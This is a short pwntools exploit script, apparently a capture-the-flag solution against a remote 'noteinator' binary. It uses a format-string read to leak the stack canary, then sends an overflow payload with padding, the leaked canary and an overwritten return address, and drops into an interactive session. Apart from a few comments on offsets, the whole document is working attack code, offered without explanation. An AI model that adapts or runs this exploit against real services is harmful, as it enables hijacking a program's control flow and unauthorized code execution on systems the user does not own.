from pwn import *

# offset 280
# %72$p
# 264 canary -> maybe around 33?
#io = process("./noteinator");
io = remote("172.31.94.166", 8080);
#pid = gdb.attach(io); #debugging

buf = b'A'*(280 - 8 - 8);
ret_addr = p64(0x0040124c);

#leak_vals = b'%41$p';
leak_vals = b'%63$p';


io.sendline('1'); #write
io.sendline(leak_vals);
io.sendline('2');
io.recvuntil("Reading...\n");
canary = int(io.recvuntil("1. ", drop=True), 16);
canary = p64(canary);
print(canary);
payload = buf + canary + b'A'*8 + ret_addr;
io.sendline('1');
io.sendline(payload);

io.sendline('3'); #return
io.interactive();
